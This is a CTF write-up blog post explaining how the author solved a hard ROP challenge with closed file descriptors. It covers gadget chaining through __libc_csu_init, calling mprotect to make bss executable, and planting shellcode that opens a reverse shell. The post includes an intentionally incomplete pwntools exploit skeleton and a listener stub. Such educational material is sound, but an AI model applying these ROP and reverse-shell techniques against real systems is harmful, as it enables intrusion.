---
layout: post
author: zafirr
title:  "The Hardest ROP problem"
description: "*That I've solved"
date: 2021-03-08
last_modified_at: 2021-03-08
categories: writeup research
lang: en
tags:
    - pwn
    - buffer overflow
    - ROP
    - ctf
---

## English
At the end of August 2020, a friend of mine asked me about a CTF challenge from a local CTF.

![Error](/assets/images/Hardest_ROP/1.png)

Translation:
```
Friend: "Fir are you busy"
Me: "No not really, whats up"
Friend: "There was the finals of XXXXX CTF, I didn't participate, but I got hold of the files. I want to ask about them"
Friend: "3 heap, 1 buffer overflow"
Friend: "I'm confused for the buffer overflow"
Me: "Okay"
<file>
Friend: "stdin, stdout, stderr is closed, so can't call read again. The binary is dynamic (dynamically linked) so there aren't many gadgets"
```

The challenge was a single binary, and the decompilation looked like this:

![Error](/assets/images/Hardest_ROP/2.png)

Extra details:

![Error](/assets/images/Hardest_ROP/3.png) <br>
![Error](/assets/images/Hardest_ROP/4.png)

Yup that's it. Some people reading this might recognize this kind of ROP challenge from the site [pwnable.tw](https://www.pwnable.tw/), there are three (3) challenges there that are similar to this one (unexploitable, Kidding, De-ASLR). From the decompilation and program security, I like to look at this problem as a mix of those three.

If you want to download the challenge files, click [here](https://drive.google.com/drive/folders/1c0BaG-S18iTLihSoEnz0B_BcrzqDb8uT?usp=sharing)

Before I go on, I suggest looking into unexploitable, Kidding, and De-ASLR, as the solution to this problem can be used to solve those ones aswell. Take a month or two, it's worth it if you want to be better at binary exploitation.

<br>
<br>

### General idea
Whenever a binary exploitation challenge closes all three file descriptors, the main way to solve the challenge is by getting shellcode. With shellcode, we can use syscalls to open a [socket](https://en.wikipedia.org/wiki/Network_socket). Since the socket will use the first file descriptor, if the socket points to an ip address that we control (say a private server), we can use that to input more payloads.

So we need shellcode, let's see if there is a rwx section in the binary:

![Error](/assets/images/Hardest_ROP/5.png)

Nope. This means we need to call mprotect or mmap. [Mprotect](https://man7.org/linux/man-pages/man2/mprotect.2.html) is probably easier, as it only requires 3 parameters to setup.

### Calling mprotect
There are two ways to call mprotect. First, we could use a syscall instruction, with the parameters required being set with ROP. Let's see if there is a syscall instruction in the exec area:

![Error](/assets/images/Hardest_ROP/6.png)

Nope. That means we need to get it from libc. Let's leave this option on hold first.

The second option is to call the mprotect function. Let's see if the GOT has this function:

![Error](/assets/images/Hardest_ROP/7.png)

Nope. That means we need to get it from libc too.

I dont know any other way to call mprotect. If you do know any, please feel free to comment it, I would love to know.

### Getting a libc value
I will be using the second method, as it's probably easier to do, since we dont need to setup the rax register. I will be skipping the exploration phase of solving this, as it took awhile to find the right way to do it. In order to get a libc value, I used the following three magic gadgets.

```
0x00000000004005dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

\*Note: this next one isn't found by ropper, use ROPgadget!
```
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

```
   0x400587:    push   r13
   0x400589:    push   r12
   0x40058b:    lea    r12,[rip+0x200836]        # 0x600dc8
   0x400592:    push   rbp
   0x400593:    lea    rbp,[rip+0x200836]        # 0x600dd0
   0x40059a:    push   rbx
   0x40059b:    mov    r13d,edi
   0x40059e:    mov    r14,rsi
   0x4005a1:    sub    rbp,r12
   0x4005a4:    sub    rsp,0x8
   0x4005a8:    sar    rbp,0x3
   0x4005ac:    call   0x400400
   0x4005b1:    test   rbp,rbp
   0x4005b4:    je     0x4005d6
   0x4005b6:    xor    ebx,ebx
   0x4005b8:    nop    DWORD PTR [rax+rax*1+0x0]
   0x4005c0:    mov    rdx,r15
   0x4005c3:    mov    rsi,r14
   0x4005c6:    mov    edi,r13d
   0x4005c9:    call   QWORD PTR [r12+rbx*8]
   0x4005cd:    add    rbx,0x1
   0x4005d1:    cmp    rbp,rbx
   0x4005d4:    jne    0x4005c0
   0x4005d6:    add    rsp,0x8
   0x4005da:    pop    rbx
   0x4005db:    pop    rbp
   0x4005dc:    pop    r12
   0x4005de:    pop    r13
   0x4005e0:    pop    r14
   0x4005e2:    pop    r15
   0x4005e4:    ret
```
\*Note: This is just __libc_csu_init!

WAIT THAT LAST ONE IS A GADGET?!??!?!?

Yup. Heck, even if we started at the beginning of the function, it would still be a gadget, since we still control where the gadget will `ret` to.

Why do we need these gadgets? Well, notice how there is no libc value in bss:

![Error](/assets/images/Hardest_ROP/8.png)

This means we need to put one there manually. It just so happens, on a Full RELRO binary, the GOT is located right before bss:

![Error](/assets/images/Hardest_ROP/9.png)

This means using the first gadget, we can put a libc value into the r13/r14 register, then continue the ROP chain using values in bss. Using the second gadget, we can write to bss, thus we can write our extended ROP chain. Using the third gadget, we can push the libc values that were in r13 to bss.

Let's see this in action!

Using the first gadget, we pop the libc values into r13 and r14

![Error](/assets/images/Hardest_ROP/10.png)<br>
![Error](/assets/images/Hardest_ROP/11.png)

Using the second gadget, I wrote a small ropchain at the beginning of bss

![Error](/assets/images/Hardest_ROP/12.png) <br>
\*Note: 0x00000000004005e0 is just popping r14 and r15, its mostly to reduce the amount of writes, but maximize the "bss stack size". This doesn't affect the exploit, as r14 and r15 aren't needed at this time

The third gadget pushes the libc values into bss!

![Error](/assets/images/Hardest_ROP/13.png)<br>
![Error](/assets/images/Hardest_ROP/14.png)<br>
![Error](/assets/images/Hardest_ROP/15.png)

Try it out for yourself! Study why the third gadget works, cause alot of stuff happens there. Explore other cool gadgets like the second, which I only found out existed just last September. Take a break too if you need, because it's alot to take in for a single blog post.

### Modifying the libc value
Now that we have a libc value in bss, we need to modify it so that it points to mprotect. If we do that, we can call it (I'll show how later), meaning we can get a rwx section!

There are two options to modify it. First, since we know the last 12 bits are always the same (static), we could change 2/3 bytes of the libc value and hope the dynamic bits are correct. Sadly, this isn't possible, since we don't have a way to input more bytes! I tried of thinking about tricks like filling stdin with more than 0x800 bytes, and then call read to flush the remaining bytes in stdin and stuff, but then realized stdin is closed! Whoops. We can scratch this option then.

The second option is to well, use the previous gadget. Let's look at it closely:

```
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

Since rbp and rbx are both controllable, this gadget can be used. Using abit of math, we need to add `0xf0b10` to the libc value. Ok let's see it in action!

![Error](/assets/images/Hardest_ROP/16.png)<br>
![Error](/assets/images/Hardest_ROP/17.png)<br>
![Error](/assets/images/Hardest_ROP/18.png)<br>
![Error](/assets/images/Hardest_ROP/19.png)<br>
![Error](/assets/images/Hardest_ROP/20.png)

Very nice :)

### Calling mprotect!
Now we need to call it. There are multiple ways of doing this, we could just use `ret` to call it, but it becomes awkward jumping back to previous valus in the ROP chain. So instead, I just used:

```
   0x4005c0:    mov    rdx,r15
   0x4005c3:    mov    rsi,r14
   0x4005c6:    mov    edi,r13d
   0x4005c9:    call   QWORD PTR [r12+rbx*8]
   0x4005cd:    add    rbx,0x1
   0x4005d1:    cmp    rbp,rbx
   0x4005d4:    jne    0x4005c0
   0x4005d6:    add    rsp,0x8
   0x4005da:    pop    rbx
   0x4005db:    pop    rbp
   0x4005dc:    pop    r12
   0x4005de:    pop    r13
   0x4005e0:    pop    r14
   0x4005e2:    pop    r15
   0x4005e4:    ret
```

The call instruction is perfect. If we set rbx = 0, rbp = 1, and r12 = the address of the libc value, then we can call mprotect. At the same time, we can use the first three instructions to setup the function parameters. So Perfect!

![Error](/assets/images/Hardest_ROP/21.png)<br>
![Error](/assets/images/Hardest_ROP/22.png)<br>
![Error](/assets/images/Hardest_ROP/23.png)

Yay!

### Shellcode?
Wait, we dont have shellcode in bss. That's okay, we have the previous gadget! At this point, the challenge was sorta golf. It takes 8 words to write just 4 bytes, so it was a matter of shrinking the shellcode alot. We can use the shellcode provided by pwntools, and shrink it manually. Oh the buffer can't fill shellcode that calls socket, dups files, AND calls a shell, so figure out how to do that (Solving Kidding should be enough!). Thanks to H\*\*\*\*\*\*\*\*\* for teaching me how to solve Kidding.

![Error](/assets/images/Hardest_ROP/24.png)

In the end, I had like less than 100 bytes left in the buffer :v

If all goes well, a shell will pop on the reverse shell. 

![Error](/assets/images/Hardest_ROP/25.png)

Added bonus, I'm not posting an exploit! Here's a rough skeleton though, cause I'm nice :)

exploit.py
```py
from pwn import *

p = process('./main.file')

add_dword_ptr_rbp_0x3d_ebx = 0x0000000000400518
pop_rbx_rbp_r12_r13_r14_r15 = 0x00000000004005da
pop_rsp_r13_r14_r15 = 0x00000000004005dd
bss = 0x0000000000601000
bss2 = 0x0000000000601900
shellcode_loc = 0x0000000000601a00
get_libc_val_in_r13 = 0x600ff0
main = 0x400537
pop_r14_r15 = 0x4005e0
push_r13 = 0x400587
leak_location = 0x601038
rdx_thing = 0x4005c0
pop_rbp = 0x00000000004004b8

context.arch = 'amd64'

def www(where, what, r12=0, r13=0, r14=0, r15=0):
    return # Lol figure it out

def write_shellcode(where):
    sc = asm('') # Shellcode goes here
    res = b""
    for i in range(0, len(sc), 4):
        res += www(# Something, something)
    return res

payload = b"A"*24
payload += b"" # ROP CHAIN!


assert len(payload) <= 2048
p.sendline(payload)

p.interactive()
p.close()(
```

rev_tcp.py
```py
from pwn import *

l = listen(10000)

l.wait_for_connection()

# Something is needed here!

l.interactive()
```

### Closing statement
I feel like I've conqured ROP now. Well atleast until someone proves me wrong.